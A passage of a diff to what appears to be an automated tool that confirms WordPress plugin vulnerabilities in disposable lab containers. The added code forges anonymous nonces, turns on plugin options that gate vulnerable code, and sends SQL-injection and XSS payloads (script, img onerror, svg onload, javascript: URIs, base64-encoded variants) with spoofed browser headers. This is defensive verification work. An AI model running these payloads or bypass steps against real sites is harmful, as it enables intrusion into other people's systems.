+                for _fn_b2 in _files_b2:
+                    if not _fn_b2.endswith(".php"):
+                        continue
+                    try:
+                        with open(os.path.join(_root_b2, _fn_b2), "r", errors="replace") as _fh_b2:
+                            for _m_b2 in _approval_meta_re.finditer(_fh_b2.read()):
+                                _approval_keys_found.add(_m_b2.group(1))
+                    except Exception:
+                        continue
+            for _ak in _approval_keys_found:
+                lab.wp_cli("user", "meta", "update", "1", _ak, "approved", timeout=10)
+                step(f"admin (ID=1) meta '{_ak}'=approved -- detectado en source como "
+                     f"filtro de directorio")
+
+            # Detect WP option keys used in gating branches (e.g. member_directory_own_table).
+            # Two-pass scan:
+            # Pass A: files with raw-SQL ORDER BY $var injection sink — collect their class names.
+            # Pass B: scan ALL PHP files for `new ClassName()` gated by an option check, where
+            #   ClassName came from pass A. This catches gating options that live in init/factory
+            #   files rather than the injection-sink file itself (e.g. UM: class-init.php gates
+            #   `new Member_Directory_Meta()` via `member_directory_own_table`, while the actual
+            #   injection sink is in class-member-directory-meta.php).
+            _gating_option_re = _re_boot.compile(
+                r"(?:um_option|get_option|->get)\s*\(\s*['\"]([a-z_]{5,50})['\"]",
+                _re_boot.IGNORECASE,
+            )
+            _raw_orderby_re = _re_boot.compile(
+                r"ORDER\s+BY\s+(?:\w+\.)?(?:\{)?\$\w+",  # ORDER BY u.$var, ORDER BY u.{$var}
+                _re_boot.IGNORECASE,
+            )
+            _class_re = _re_boot.compile(
+                r"class\s+(\w+)",
+                _re_boot.IGNORECASE,
+            )
+            # Pass A: collect class names from injection-sink files
+            _sink_classes: set = set()
+            _all_php_contents: dict = {}  # path -> content (reuse in pass B)
+            for _root_b3, _, _files_b3 in os.walk(plugin_source_dir):
+                for _fn_b3 in _files_b3:
+                    if not _fn_b3.endswith(".php"):
+                        continue
+                    try:
+                        _fp_b3 = os.path.join(_root_b3, _fn_b3)
+                        with open(_fp_b3, "r", errors="replace") as _fh_b3:
+                            _content_b3 = _fh_b3.read()
+                        _all_php_contents[_fp_b3] = _content_b3
+                        if _raw_orderby_re.search(_content_b3):
+                            for _mc in _class_re.finditer(_content_b3):
+                                _sink_classes.add(_mc.group(1))
+                    except Exception:
+                        continue
+            # Pass B: find options that gate instantiation of sink classes.
+            # Locality filter: only count an option if it appears within 600 chars of a
+            # `new SinkClass()` call — this excludes unrelated option reads in the same file.
+            _gating_opts_found: dict = {}
+            _new_class_re = (_re_boot.compile(
+                r"new\s+(?:\w+\\)*(" + "|".join(_re_boot.escape(c) for c in _sink_classes) + r")\b",
+                _re_boot.IGNORECASE,
+            ) if _sink_classes else None)
+            _locality = 600  # chars before/after 'new SinkClass()' to consider
+            for _fp_b3, _content_b3 in _all_php_contents.items():
+                _has_sink = _raw_orderby_re.search(_content_b3)
+                _has_new = bool(_new_class_re and _new_class_re.search(_content_b3)) if _new_class_re else False
+                if not (_has_sink or _has_new):
+                    continue
+                # Apply locality filter for BOTH sink and factory files:
+                # collect options near the injection/instantiation point (not whole file).
+                _search_re = _raw_orderby_re if _has_sink else _new_class_re
+                for _mn in _search_re.finditer(_content_b3):
+                    _window = _content_b3[max(0, _mn.start() - _locality): _mn.end() + _locality]
+                    for _m_b3 in _gating_option_re.finditer(_window):
+                        _gating_opts_found[_m_b3.group(1)] = "1"
+            # Safety cap: if more than 3 options found, the scan may be too broad — skip auto-enable
+            if len(_gating_opts_found) > 3:
+                step(f"[source-analysis] demasiadas opciones detectadas en rama vulnerable "
+                     f"({len(_gating_opts_found)}) -- saltando auto-activacion para evitar "
+                     f"efectos secundarios: {list(_gating_opts_found)[:5]}")
+                _gating_opts_found = {}
+            # Detect the plugin's options blob key from source (e.g. 'um_options' for
+            # Ultimate Member).  Plugins typically store settings in one serialized WP
+            # option; scanning for get_option('X') is cheaper than guessing the slug.
+            _blob_key_re = _re_boot.compile(
+                r"get_option\s*\(\s*['\"]([a-z][a-z0-9_]{2,40})['\"]",
+                _re_boot.IGNORECASE,
+            )
+            _blob_candidates: dict = {}
+            for _fc3 in _all_php_contents.values():
+                for _bm in _blob_key_re.finditer(_fc3):
+                    _bk = _bm.group(1)
+                    if _bk.endswith("_options") or "_option" in _bk:
+                        _blob_candidates[_bk] = _blob_candidates.get(_bk, 0) + 1
+            # Most-referenced plugin-options blob key (exclude generic WP keys)
+            _wp_generic = {"siteurl", "blogname", "blogdescription", "admin_email",
+                           "active_plugins", "template", "stylesheet", "wp_user_roles"}
+            _plugin_blob_key = max(
+                (_bk for _bk in _blob_candidates if _bk not in _wp_generic),
+                key=_blob_candidates.get,
+                default=slug.replace("-", "_") + "_options",
+            )
+            for _go_key, _go_val in _gating_opts_found.items():
+                if _go_key in {o.get("name") for o in (setup_wp_options or [])
+                               if isinstance(o, dict)}:
+                    continue  # already set by caller
+                # Use PHP eval to update the option inside the blob — 100% reliable even
+                # when the key already exists (insert vs update confusion with wp-cli patch).
+                _php_set = (
+                    f"$opts=get_option('{_plugin_blob_key}',array());"
+                    f"$opts['{_go_key}']={_go_val};"
+                    f"update_option('{_plugin_blob_key}',$opts);"
+                    f"$v=get_option('{_plugin_blob_key}');"
+                    f"echo isset($v['{_go_key}'])?'ok:'.$v['{_go_key}']:'missing';"
+                )
+                _r_set = lab.wp_cli("eval", _php_set, timeout=10)
+                _set_out = (_r_set.stdout or "").strip()
+                if _r_set.returncode != 0 or not _set_out.startswith("ok:"):
+                    # Blob approach failed — fall back to top-level option
+                    lab.wp_cli("option", "update", _go_key, _go_val, timeout=10)
+                step(f"opcion detectada en source: '{_go_key}'={_go_val} activada "
+                     f"en '{_plugin_blob_key}' (branch vulnerable requiere esta opcion)")
+
+    # Diagnostic: verify options + hash lookup work from within WordPress (WP-CLI context).
+    # Runs after all options are set so we see the actual live state.
+    if _um_hashed and _gating_opts_found:
+        _diag_hash = _um_hashed
+        _diag_key = next(iter(_gating_opts_found), "member_directory_own_table")
+        # Minimal PHP — no UM() calls that might fail in WP-CLI context
+        _diag_php = (
+            "global $wpdb; "
+            f"$h='{_diag_hash}'; "
+            "$id=$wpdb->get_var($wpdb->prepare("
+            "'SELECT ID FROM '.$wpdb->posts.' WHERE SUBSTRING(MD5(ID),11,5)=%s',$h)); "
+            f"$opts=get_option('um_options',array()); "
+            f"$oval=isset($opts['{_diag_key}'])?$opts['{_diag_key}']:'NOT_SET'; "
+            "$cnt=$wpdb->get_var('SELECT COUNT(*) FROM '.$wpdb->posts); "
+            "echo 'id:'.var_export($id,true).'|opt:'.$oval.'|posts:'.$cnt;"
+        )
+        _r_diag = lab.wp_cli("eval", _diag_php, timeout=15)
+        _diag_out = (_r_diag.stdout or _r_diag.stderr or "").strip()[:300]
+        step(f"[DIAG] hash+opt check: {_diag_out!r} (rc={_r_diag.returncode})")
+
+    # Detect the directory-specific shortcode from source: for plugins that have multiple
+    # shortcodes (e.g. login form + directory listing), find_shortcode_name() may return
+    # the wrong one. The correct one is the shortcode in the same PHP file(s) that handle
+    # the directory CPT — _detect_directory_shortcode_from_source() scans for it.
+    _sc_from_source = (_detect_directory_shortcode_from_source(plugin_source_dir, directory_cpt)
+                       if directory_cpt else None)
+    _effective_shortcode = _sc_from_source if _sc_from_source else shortcode_name
+    if _sc_from_source and _sc_from_source != shortcode_name:
+        step(f"shortcode detectado en source: '{_sc_from_source}' (en lugar de "
+             f"'{shortcode_name}' sugerido por heuristica) -- este es el que registra "
+             f"el JS del directorio con el nonce necesario")
     if _effective_shortcode and dir_post_id:
         _sc_base = _effective_shortcode.split()[0]
-        # Append the real CPT post ID for directory-type shortcodes.
-        if _sc_base.endswith("_directory"):
+        # Append the real CPT post ID when the shortcode corresponds to a directory CPT.
+        # Detected: shortcode name contains the CPT keyword (e.g. '_directory' from 'um_directory').
+        _cpt_keyword = directory_cpt.split("_", 1)[-1] if directory_cpt else "directory"
+        if _cpt_keyword and _cpt_keyword in _sc_base:
             _effective_shortcode = f'{_sc_base} id="{dir_post_id}"'
 
     if _effective_shortcode:
@@ -1773,7 +2154,8 @@ def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: Wp
     return _LabSession(lab=lab, base_url=base_url, admin_id=admin_id, admin_user=admin_user,
                        admin_pass=admin_pass, sub_user=sub_user, sub_pass=sub_pass,
                        sub_sess=sess, admin_sess=admin_sess, shots=shots, capture=capture,
-                       shortcode_page_path=shortcode_page_path)
+                       shortcode_page_path=shortcode_page_path,
+                       directory_hash=_um_hashed)
 
 
 def verify_wordpress_account_takeover(
@@ -2500,7 +2882,8 @@ def verify_wordpress_header_auth_bypass(
         return res
     finally:
         if not (keep_lab_on_failure and not res.verified):
-            _teardown_lab(lab, step)
+            step("desmontando el laboratorio (contenedores/red/volumen)...")
+            lab.teardown()
 
 
 def verify_wordpress_path_traversal(
@@ -3361,7 +3744,8 @@ def verify_wordpress_sqli(
         # para que todos los verify_* dinamicos lo compartan en vez de duplicar esta logica.
         endpoint, base_params = _auto_resolve_wp_blockers(
             boot, lab, slug, m, endpoint, base_params, sqli_param, res, step,
-            extra_nonce_pages=extra_nonce_pages)
+            extra_nonce_pages=extra_nonce_pages,
+            plugin_source_dir=plugin_source_dir)
 
         orig_value = str(base_params.get(sqli_param) or "1")
 
@@ -3380,38 +3764,207 @@ def verify_wordpress_sqli(
                      f"'{gate['meta_key']}' del recurso real (post {gate_post_id}) -- se "
                      f"sincronizara esa meta con cada valor probado antes de enviarlo")
 
-        # For plugins where the vulnerable endpoint is unauthenticated (see
-        # _SQLI_ANON_ATTACK_SLUGS), predefined_no_caps() or similar guards short-circuit and
-        # return empty when a logged-in user WITHOUT the required capability sends the request.
-        # Use a fresh anonymous session instead — no cookies, nonce scraped anonymously from
-        # the directory page so it verifies for user 0.
+        # Detect whether the endpoint is unauthenticated by scanning the installed plugin source
+        # for add_action('wp_ajax_nopriv_ACTION', ...). No hardcoded list — works for any plugin.
+        # When nopriv: some plugins (e.g. Ultimate Member) have capability guards that short-circuit
+        # for logged-in users without the right cap, so the attack must be sent anonymously.
         import requests as _requests_mod
-        _anon_attack = slug in _SQLI_ANON_ATTACK_SLUGS
+        _action_m = re.search(r"[?&]action=(\w+)", endpoint or "")
+        _action_name = _action_m.group(1) if _action_m else ""
+        _anon_attack = bool(_action_name and _detect_nopriv_from_source(plugin_source_dir, _action_name))
+        if _anon_attack:
+            step(f"fuente del plugin detecta wp_ajax_nopriv_{_action_name} → ataque anonimo (sin sesion de usuario)")
         _attack_sess = boot.sub_sess
         if _anon_attack:
             _attack_sess = _requests_mod.Session()
             _attack_sess.headers.update({"User-Agent": "Mozilla/5.0 binoracle-lab"})
-            # Re-scrape nonce anonymously (nonce is user-specific — sub nonce ≠ anon nonce).
-            _anon_nonce_pages = list(extra_nonce_pages or [])
-            if boot.shortcode_page_path and boot.shortcode_page_path not in _anon_nonce_pages:
-                _anon_nonce_pages.insert(0, boot.shortcode_page_path)
-            if not _anon_nonce_pages:
-                _anon_nonce_pages = ["/"]
-            for _np in _anon_nonce_pages:
-                try:
-                    _nr = _attack_sess.get(boot.base_url + _np, timeout=15)
-                    _anon_nonce_m = re.search(
-                        r'(?:nonce|security)["\']?\s*[:=]\s*["\']([a-f0-9]{8,16})["\']',
-                        _nr.text or "", re.I)
-                    if _anon_nonce_m:
-                        for nk in list(base_params.keys()):
-                            if any(h in nk.lower() for h in ("nonce", "security", "token")):
-                                base_params[nk] = _anon_nonce_m.group(1)
-                                break
-                        step(f"nonce anonimo (usuario 0) raspado de '{_np}' para sesion anonima")
-                        break
-                except Exception:
-                    pass
+            # For anonymous attacks the nonce MUST be for user_id=0: a subscriber nonce does
+            # not validate for user 0. Page scraping (done by _auto_resolve_wp_blockers) may
+            # have found a subscriber-session nonce — override it with one generated via wp eval
+            # running as user_id=0, which reliably produces the right nonce regardless of whether
+            # any page embeds it. Falls back to anonymous page re-scraping if wp eval fails.
+            _anon_nonce_keys = [nk for nk in base_params
+                                if any(h in nk.lower() for h in ("nonce", "security", "token"))]
+            _anon_wp_eval_done = False
+            if _anon_nonce_keys and lab is not None:
+                # Two-pass: first find the wp_verify_nonce action in the files that
+                # register wp_ajax_nopriv_ACTION (the actual callback files), then fall
+                # back to global scan. This avoids picking up nonce actions from unrelated
+                # handlers that happen to appear first in directory order.
+                # Three-pass nonce action detection:
+                # 1. Find files registering wp_ajax_nopriv_ACTION → extract callback method name
+                # 2. Find files that define that method AND have check_ajax_referer/wp_verify_nonce
+                # 3. Global scan fallback, preferring files with the action word in their name
+                # This handles the common pattern where registration file ≠ callback class file.
+                _eval_find_action = (
+                    f"$slug='{slug}';"
+                    f"$nopriv_action='{_action_name}';"
+                    r"$dir=WP_PLUGIN_DIR.'/'.$slug.'/';"
+                    r"$nonce_action='';"
+                    r"$nonce_extract='/(?:wp_verify_nonce\s*\(\s*\$\w+\s*,|check_ajax_referer\s*\()\s*[\x27\x22]([\w\-]{3,60})[\x27\x22]/i';"
+                    r"$cb_re='/add_action\s*\([^\)]*nopriv_'.preg_quote($nopriv_action,'/').'[^\)]*,\s*[\[\(]?[^\]\),]+,\s*[\x27\x22](\w+)[\x27\x22]/is';"
+                    r"try{$it=new RecursiveIteratorIterator("
+                    r"new RecursiveDirectoryIterator($dir,FilesystemIterator::SKIP_DOTS));"
+                    r"$reg_files=[];$all_php=[];"
+                    r"foreach($it as $f){"
+                    r"if($f->getExtension()!=='php')continue;"
+                    r"$c=@file_get_contents($f->getPathname());"
+                    r"if(!$c)continue;"
+                    r"$all_php[$f->getPathname()]=$c;"
+                    r"if(strpos($c,'wp_ajax_nopriv_'.$nopriv_action)!==false)$reg_files[$f->getPathname()]=$c;"
+                    r"}"
+                    # Pass 0.5: proximity search — find check_ajax_referer NEAR the action keyword
+                    # (within 3000 chars). This handles plugins that register actions dynamically
+                    # so no literal 'wp_ajax_nopriv_ACTION' exists, AND avoids false positives
+                    # from unrelated files that happen to contain both keywords far apart.
+                    # For um_get_members: 'get_members' is in the function body of ajax_get_members
+                    # right next to check_ajax_referer('um-frontend-nonce') in class-member-
+                    # directory-meta.php, while settings files don't have 'get_members' anywhere.
+                    r"if(!$nonce_action){"
+                    r"$aparts2=array_values(array_filter(explode('_',$nopriv_action),function($p){return strlen($p)>3;}));"
+                    r"$kw2=implode('_',array_slice($aparts2,-2));$win=3000;"
+                    r"if(!$kw2)$kw2=$nopriv_action;"
+                    r"foreach($all_php as $fp=>$fc){"
+                    r"if(stripos($fp,DIRECTORY_SEPARATOR.'admin'.DIRECTORY_SEPARATOR)!==false)continue;"
+                    r"$pos=0;"
+                    r"while(($kpos=stripos($fc,$kw2,$pos))!==false){"
+                    r"$seg=substr($fc,max(0,$kpos-$win),min(strlen($fc),$kpos+$win)-max(0,$kpos-$win));"
+                    r"if(preg_match($nonce_extract,$seg,$m)){$nonce_action=$m[1];break 2;}"
+                    r"$pos=$kpos+1;"
+                    r"}}}"
+                    # Pass 1: check registration files directly
+                    r"foreach($reg_files as $rp=>$rc){"
+                    r"if(preg_match($nonce_extract,$rc,$m)){$nonce_action=$m[1];break;}"
+                    r"}"
+                    # Pass 2: extract callback method name from registration, find defining file
+                    r"if(!$nonce_action){"
+                    r"$cb_method='';"
+                    r"foreach($reg_files as $rp=>$rc){"
+                    r"if(preg_match($cb_re,$rc,$m)){$cb_method=$m[1];break;}"
+                    r"}"
+                    r"if($cb_method){"
+                    r"foreach($all_php as $fp=>$fc){"
+                    r"if(strpos($fc,'function '.$cb_method)===false)continue;"
+                    r"if(preg_match($nonce_extract,$fc,$m)){$nonce_action=$m[1];break;}"
+                    r"}}}"
+                    # Pass 2.5: files that contain a significant part of the action name (>3 chars)
+                    # AND a nonce check -- handles plugins that register actions dynamically
+                    # so no literal 'wp_ajax_nopriv_ACTION' string exists in any file.
+                    # E.g. UM registers via apply_filters, so $reg_files is empty; but the
+                    # handler file (class-ajax-common.php) contains 'members' (from the method
+                    # name ajax_get_members) AND check_ajax_referer('um-frontend-nonce').
+                    r"if(!$nonce_action){"
+                    r"$aparts=array_filter(explode('_',$nopriv_action),function($p){return strlen($p)>3;});"
+                    r"if($aparts){"
+                    r"foreach($all_php as $fp=>$fc){"
+                    r"if(stripos($fp,DIRECTORY_SEPARATOR.'admin'.DIRECTORY_SEPARATOR)!==false)continue;"
+                    r"if(!preg_match($nonce_extract,$fc,$m))continue;"
+                    r"$has_part=false;"
+                    r"foreach($aparts as $ap){if(stripos($fc,$ap)!==false){$has_part=true;break;}}"
+                    r"if($has_part){$nonce_action=$m[1];break;}"
+                    r"}}}"
+                    # Pass 2.7: wp_create_nonce in frontend JS-localization files.
+                    # Handles plugins that pass the nonce to JS via wp_localize_script,
+                    # e.g. UM's class-enqueue.php:
+                    #   wp_localize_script('um_scripts', 'um', [
+                    #     'nonce' => wp_create_nonce('um-frontend-nonce'), ...
+                    #   ]);
+                    # nonce_extract never matches these (they use wp_create_nonce, not
+                    # check_ajax_referer/wp_verify_nonce with a literal action).
+                    # Strategy: find non-admin files that have BOTH wp_localize_script
+                    # AND wp_create_nonce('literal'), prefer files in a 'frontend' dir.
+                    r"if(!$nonce_action){"
+                    r"$create_re='/wp_create_nonce\s*\(\s*[\x27\x22]([\w\-]{3,60})[\x27\x22]/i';"
+                    r"$loc_prio=[];$loc_rest=[];"
+                    r"foreach($all_php as $fp=>$fc){"
+                    r"if(stripos($fp,DIRECTORY_SEPARATOR.'admin'.DIRECTORY_SEPARATOR)!==false)continue;"
+                    r"if(stripos($fc,'wp_localize_script')===false)continue;"
+                    r"if(!preg_match($create_re,$fc,$m))continue;"
+                    r"if(stripos($fp,DIRECTORY_SEPARATOR.'frontend'.DIRECTORY_SEPARATOR)!==false)$loc_prio[]=$m[1];"
+                    r"else $loc_rest[]=$m[1];"
+                    r"}"
+                    r"if($loc_prio)$nonce_action=$loc_prio[0];"
+                    r"elseif($loc_rest)$nonce_action=$loc_rest[0];"
+                    r"}"
+                    # Pass 2.8: indirect wp_verify_nonce — variable action with ternary default.
+                    # For plugins that wrap the nonce check in a helper method:
+                    #   function check_ajax_nonce($action=false){
+                    #     $action = empty($action) ? 'nonce-action' : $action;
+                    #     wp_verify_nonce($nonce, $action);
+                    #   }
+                    r"if(!$nonce_action){"
+                    r"$indirect_re='/wp_verify_nonce\s*\(\s*\$\w+\s*,\s*\$\w+/is';"
+                    r"$ternary_re='/empty\s*\([^\)]+\)\s*\?\s*[\x27\x22]([\w\-]{3,60})[\x27\x22]/i';"
+                    r"foreach($all_php as $fp=>$fc){"
+                    r"if(stripos($fp,DIRECTORY_SEPARATOR.'admin'.DIRECTORY_SEPARATOR)!==false)continue;"
+                    r"if(preg_match($indirect_re,$fc)&&preg_match($ternary_re,$fc,$m)){$nonce_action=$m[1];break;}"
+                    r"}}"
+                    # Pass 3: global scan - prefer files whose name contains action keyword
+                    r"if(!$nonce_action){"
+                    r"$kw=str_replace('_','-',$nopriv_action);"
+                    r"$prio=[];$rest=[];"
+                    r"foreach($all_php as $fp=>$fc){"
+                    r"if(strpos(strtolower(basename($fp)),$kw)!==false||strpos(strtolower(basename($fp)),str_replace('-','_',$kw))!==false)$prio[$fp]=$fc;"
+                    r"else $rest[$fp]=$fc;"
+                    r"}"
+                    r"foreach(array_merge($prio,$rest) as $fp=>$fc){"
+                    r"if(preg_match($nonce_extract,$fc,$m)){$nonce_action=$m[1];break;}"
+                    r"}}"
+                    r"}catch(Exception $e){}"
+                    r"echo $nonce_action;"
+                )
+                r_act = lab.wp_cli("eval", _eval_find_action, timeout=15)
+                _nonce_act = (r_act.stdout or "").strip()
+                # Sanity-check: a nopriv (unauthenticated) endpoint's nonce action
+                # should NOT be from the admin/settings area. If the scan landed on a
+                # settings or admin file (happens when passes 1+2 fail and pass 2.5/3
+                # find an unrelated file first), the generated nonce will always fail
+                # check_ajax_referer for the frontend endpoint. Drop it and fall
+                # through to the fallback scraping which re-scrapes from the actual
+                # published page with the anonymous session.
+                _admin_nonce_words = {"settings", "admin", "config", "options",
+                                      "dashboard", "panel", "backend"}
+                if _nonce_act and any(w in _nonce_act.lower()
+                                      for w in _admin_nonce_words):
+                    step(f"nonce action '{_nonce_act}' descartado (parece area admin, "
+                         f"no frontend) -- usando fallback scraping anonimo en su lugar")
+                    _nonce_act = ""
+                if _nonce_act:
+                    r_gen = lab.wp_cli("eval",
+                        f"wp_set_current_user(0);echo wp_create_nonce('{_nonce_act}');",
+                        timeout=10)
+                    _gen = (r_gen.stdout or "").strip()
+                    if _gen and len(_gen) >= 10:
+                        for nk in _anon_nonce_keys:
+                            base_params[nk] = _gen
+                        step(f"nonce anonimo (user_id=0) generado via wp eval "
+                             f"(accion='{_nonce_act}') -- sobreescribe nonce scraped para "
+                             f"sesion anonima")
+                        res.evidence["nonce_anonimo_via_eval"] = {
+                            "action": _nonce_act, "value": _gen}
+                        _anon_wp_eval_done = True
+            if not _anon_wp_eval_done:
+                # Fallback: re-scrape anonymously from published pages
+                _anon_nonce_pages = list(extra_nonce_pages or [])
+                if boot.shortcode_page_path and boot.shortcode_page_path not in _anon_nonce_pages:
+                    _anon_nonce_pages.insert(0, boot.shortcode_page_path)
+                if not _anon_nonce_pages:
+                    _anon_nonce_pages = ["/"]
+                for _np in _anon_nonce_pages:
+                    try:
+                        _nr = _attack_sess.get(boot.base_url + _np, timeout=15)
+                        _anon_nonce_m = re.search(
+                            r'(?:nonce|security)["\']?\s*[:=]\s*["\']([a-f0-9]{8,16})["\']',
+                            _nr.text or "", re.I)
+                        if _anon_nonce_m:
+                            for nk in list(base_params.keys()):
+                                if any(h in nk.lower() for h in ("nonce", "security", "token")):
+                                    base_params[nk] = _anon_nonce_m.group(1)
+                                    break
+                            step(f"nonce anonimo raspado de '{_np}' (fallback)")
+                            break
+                    except Exception:
+                        pass
 
         def send(val):
             if gate_post_id is not None:
@@ -3433,6 +3986,56 @@ def verify_wordpress_sqli(
         except Exception as e:
             res.detail = f"la peticion de control fallo: {e}"
             return res
+        # If the control response contains a MySQL ORDER BY error, the LLM-supplied default
+        # value for the sqli_param is not a valid column name. Scan the plugin source for the
+        # ORDER BY sink to find the right fallback values, then try them before giving up.
+        _ORDER_BY_ERR_RE = re.compile(
+            r"Unknown column|ORDER BY|You have an error in your SQL syntax|wpdb error", re.I)
+        if _ORDER_BY_ERR_RE.search(base_resp.text or ""):
+            # Build candidate safe values: scan plugin source for valid sortby options
+            _sort_candidates: list = []
+            if plugin_source_dir and os.path.isdir(plugin_source_dir):
+                _sortby_re = re.compile(
+                    r"(?:elseif|case|==|===)\s*[\(\s]*['\"]?([\w]+)['\"]?\s*[\)]*\s*(?:===|==)\s*\$sortby"
+                    r"|sortby.*?==.*?['\"](\w+)['\"]"
+                    r"|['\"](\w+)['\"].*?==.*?sortby",
+                    re.I)
+                _order_by_col_re = re.compile(
+                    r"ORDER BY u\.(\w+)", re.I)
+                for _root_s, _, _files_s in os.walk(plugin_source_dir):
+                    for _fn_s in _files_s:
+                        if not _fn_s.endswith(".php"): continue
+                        try:
+                            _fc_s = open(os.path.join(_root_s, _fn_s),
+                                         encoding="utf-8", errors="replace").read()
+                        except Exception: continue
+                        if "ORDER BY u." not in _fc_s: continue
+                        for _m_s in _order_by_col_re.finditer(_fc_s):
+                            _col = _m_s.group(1)
+                            if _col.isidentifier() and _col not in _sort_candidates:
+                                _sort_candidates.append(_col)
+            # universal fallback list for WP user tables
+            for _cand in ("user_login", "user_registered", "display_name", "ID",
+                          "registered", "username"):
+                if _cand not in _sort_candidates:
+                    _sort_candidates.append(_cand)
+            _fixed = False
+            for _cand in _sort_candidates:
+                try:
+                    _test_resp = send(_cand)
+                except Exception:
+                    continue
+                if not _ORDER_BY_ERR_RE.search(_test_resp.text or ""):
+                    orig_value = _cand
+                    base_resp = _test_resp
+                    step(f"valor de control para '{sqli_param}' corregido a '{_cand}' (valor LLM "
+                         f"causaba error ORDER BY; hallado escaneando el source del plugin)")
+                    _fixed = True
+                    break
+            if not _fixed:
+                step(f"[WARN] valor de control '{orig_value}' produce error ORDER BY en "
+                     f"'{sqli_param}' y ningun candidato lo corrigio -- continuando con la "
+                     f"respuesta de error como baseline (el diferencial puede ser invalido)")
         base_len = len(base_resp.text or "")
         # recorte del cuerpo real de la peticion de CONTROL (sin inyeccion) -- confirmado en
         # vivo, CVE-2024-3552: un negativo sin esto no se puede diagnosticar sin relanzar el
@@ -4080,6 +4683,9 @@ def verify_wordpress_xss(
     shortcode_name: Optional[str] = None,
     keep_lab_on_failure: bool = False,
     stored_xss_view_path: str = "",
+    payload_transform: str = "",
+    extra_inject_params: Optional[dict] = None,
+    render_context: str = "unknown",
 ) -> WpVerifyResult:
     """Verifica XSS en dos modos:
 
@@ -4135,6 +4741,15 @@ def verify_wordpress_xss(
 
         m = (http_method or "GET").upper()
         base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
+        # Params de activacion de hook que se envian con TODOS los intentos de inyeccion
+        # (ej: wp_statistics_hit_rest=1, current_page_type=home, current_page_id=0)
+        if extra_inject_params:
+            # Sobreescribir valores vacios: dict.fromkeys(params, "") inicializa todos a "".
+            # La condicion `k not in base_params` bloquearia TODOS los activation params
+            # porque ya estan en base_params con valor "". Se sobreescriben solo los que
+            # tienen valor vacio/falsy para no pisar valores explicitamente pasados por el LLM.
+            base_params.update({k: v for k, v in extra_inject_params.items()
+                                 if not base_params.get(k)})
         endpoint, base_params = _auto_resolve_wp_blockers(
             boot, lab, slug, m, endpoint, base_params, xss_param, res, step,
             extra_nonce_pages=extra_nonce_pages)
@@ -4147,6 +4762,7 @@ def verify_wordpress_xss(
         token = _token()
         marker = f"binoracle-xss-{token}"
         js = f"document.title='{marker}'"
+
         attempts = [
             # contexto HTML normal (el payload cae directo en el cuerpo de la pagina)
             f"<script>{js}</script>",
@@ -4160,6 +4776,11 @@ def verify_wordpress_xss(
             # rotura de atributo HTML (el payload cae DENTRO de value="..."/placeholder="..." etc.)
             f"\"><script>{js}</script>",
             f"'><script>{js}</script>",
+            # rotura de href="..." (el URI almacenado se inyecta en el atributo href de un <a>)
+            # -- necesita romper con " y ejecutar via onerror/onload, NO via <script> (innerHTML)
+            f"\"><img src=x onerror=\"{js}\">",
+            f"\"><svg onload=\"{js}\">",
+            f"'><img src=x onerror=\"{js}\">",
             f"\" onmouseover=\"{js}\" x=\"",
             f"' onmouseover='{js}' x='",
             f"\" autofocus onfocus=\"{js}\" x=\"",
@@ -4185,6 +4806,57 @@ def verify_wordpress_xss(
         from .payload_kb import load_xss_payloads
         attempts += load_xss_payloads(js)
 
+        # Si el scanner deterministico detecto el contexto de renderizado, reorganizar
+        # attempts para probar primero los payloads especificos de ese contexto.
+        # El resto queda al final como red de seguridad, pero normalmente no se llega.
+        if render_context and render_context != "unknown":
+            _CTX_PAYLOADS = {
+                # Valor cae dentro de href="VALUE" o similar — necesita romper el atributo
+                # o usar javascript: directamente como URI
+                "href": [
+                    f"javascript:{js}",
+                    f"\"><img src=x onerror=\"{js}\">",
+                    f"'><img src=x onerror=\"{js}\">",
+                    f"\"><svg onload=\"{js}\">",
+                    f"\" onmouseover=\"{js}\" x=\"",
+                    f"<a href=\"jav&#x09;ascript:{js}\">x</a>",
+                ],
+                # Valor cae en nodo de texto HTML — tags directos funcionan
+                "html": [
+                    f"<script>{js}</script>",
+                    f"<img src=x onerror=\"{js}\">",
+                    f"<svg onload=\"{js}\">",
+                    f"<ScRiPt>{js}</sCrIpT>",
+                    f"<details open ontoggle=\"{js}\">x</details>",
+                ],
+                # Valor cae dentro de un string JS existente — hay que cerrar la cadena
+                "js_string": [
+                    f"';{js};//",
+                    f'";{js};//',
+                    f"</script><script>{js}</script>",
+                ],
+                # Valor cae en atributo src/action/data — similar a href
+                "url": [
+                    f"javascript:{js}",
+                    f"\"><img src=x onerror=\"{js}\">",
+                    f"\"><svg onload=\"{js}\">",
+                ],
+                # Valor se inserta via template literal en .html()/innerHTML:
+                # `<a href="${siteUrl}${value['str_url']}"...` → romper href + inyectar tag
+                "js_innerHTML": [
+                    f"\"><img src=x onerror=\"{js}\">",
+                    f"'><img src=x onerror=\"{js}\">",
+                    f"\"><svg onload=\"{js}\">",
+                    f"\"><script>{js}</script>",
+                    f"\" onmouseover=\"{js}\" x=\"",
+                ],
+            }
+            _priority = _CTX_PAYLOADS.get(render_context, [])
+            if _priority:
+                _priority_set = set(_priority)
+                _rest = [a for a in attempts if a not in _priority_set]
+                attempts = _priority + _rest
+
         found = False
         tried = []
 
@@ -4199,22 +4871,42 @@ def verify_wordpress_xss(
                  f"'{stored_xss_view_path}'...")
             step(f"arrancando Chromium headless (modo stored-XSS, {len(attempts)} payloads)...")
             with _XssBrowserSession() as xb:
+                import base64 as _base64
                 for payload_value in attempts:
                     params_inject = dict(base_params)
-                    params_inject[xss_param] = payload_value
-                    # PASO 1: subscriber inyecta (peticion HTTP, sin render)
+                    # Aplicar transformacion de payload si el endpoint lo requiere
+                    # (ej: WP Statistics espera page_uri base64-encoded para bypass de sanitize_url)
+                    _effective_payload = payload_value
+                    if payload_transform == "base64":
+                        _effective_payload = _base64.b64encode(
+                            payload_value.encode()).decode()
+                    params_inject[xss_param] = _effective_payload
+                    # PASO 1: subscriber inyecta (peticion HTTP, sin render).
+                    # Si el endpoint es REST API (/wp-json/...) usamos User-Agent de navegador real
+                    # para evitar que el plugin identifique la peticion como bot y la ignore.
+                    _inject_headers = {}
+                    if "/wp-json/" in endpoint:
+                        _inject_headers = {"User-Agent": (
+                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                            "AppleWebKit/537.36 (KHTML, like Gecko) "
+                            "Chrome/120.0.0.0 Safari/537.36")}
                     try:
                         boot.sub_sess.request(
                             m, boot.base_url + endpoint, timeout=20,
                             data=params_inject if m != "GET" else None,
-                            params=params_inject if m == "GET" else None)
